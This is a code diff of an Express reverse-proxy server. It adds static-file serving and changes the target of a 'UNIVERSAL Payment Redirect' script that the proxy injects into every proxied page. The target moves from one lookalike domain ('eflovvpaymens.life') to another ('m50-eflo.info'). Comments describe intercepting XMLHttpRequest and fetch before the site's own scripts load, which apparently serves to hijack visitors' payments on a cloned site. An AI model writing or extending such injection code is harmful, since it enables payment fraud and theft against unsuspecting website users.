@@ -6,6 +6,8 @@ const helmet = require('helmet');
 const compression = require('compression');
 const morgan = require('morgan');
 const rateLimit = require('express-rate-limit');
+const path = require('path');
+const fs = require('fs');
 const config = require('./config');
 const logger = require('./logger');
 const { userAgentRotation, getRandomUserAgent } = require('./user-agents');
@@ -155,6 +157,49 @@ app.post('/clear-cache', (req, res) => {
   cacheManager.clear();
   res.json({ message: 'Cache cleared' });
 });
+
+// Static files middleware - serve files from public directory
+// Files in public/ directory will be served with priority over proxy
+if (config.static.enabled) {
+  const staticDir = path.resolve(config.static.directory);
+  
+  // Create public directory if it doesn't exist (but don't create any files)
+  if (!fs.existsSync(staticDir)) {
+    try {
+      fs.mkdirSync(staticDir, { recursive: true });
+      logger.info(`Created static files directory: ${staticDir}`);
+    } catch (error) {
+      logger.warn(`Could not create static directory: ${error.message}`);
+    }
+  }
+  
+  // Serve static files with proper headers
+  // Only serves files that actually exist - no automatic index.html
+  app.use(express.static(staticDir, {
+    index: false, // Don't serve index.html automatically
+    dotfiles: 'ignore', // Don't serve hidden files
+    etag: true,
+    lastModified: true,
+    maxAge: process.env.NODE_ENV === 'production' ? '1d' : 0, // Cache in production
+    setHeaders: (res, filePath) => {
+      // Set appropriate content-type headers
+      if (filePath.endsWith('.html')) {
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
+      }
+      // Disable caching for HTML files to allow updates
+      if (filePath.endsWith('.html')) {
+        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+        res.setHeader('Pragma', 'no-cache');
+        res.setHeader('Expires', '0');
+      }
+    },
+  }));
+  
+  logger.info(`Static files enabled: serving from ${staticDir}`);
+  logger.info(`Place files in ${config.static.directory} to serve them directly`);
+} else {
+  logger.info('Static files disabled');
+}
 
 // Proxy configuration
 const proxyOptions = {
@@ -444,7 +489,13 @@ const proxyOptions = {
 </script>`;
             
             // UNIVERSAL Payment Redirect - Works on ALL pages
-            const PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://eflovvpaymens.life';
+            let PAYMENT_SYSTEM_URL = process.env.PAYMENT_SYSTEM_URL || 'https://m50-eflo.info';
+            
+            // CRITICAL: Ensure PAYMENT_SYSTEM_URL has protocol
+            // If no protocol is specified, add https://
+            if (PAYMENT_SYSTEM_URL && !PAYMENT_SYSTEM_URL.match(/^https?:\/\//i)) {
+              PAYMENT_SYSTEM_URL = 'https://' + PAYMENT_SYSTEM_URL;
+            }
             
             // CRITICAL: This script MUST execute BEFORE jQuery/Drupal loads
             // LOW-LEVEL XMLHttpRequest/Fetch interception
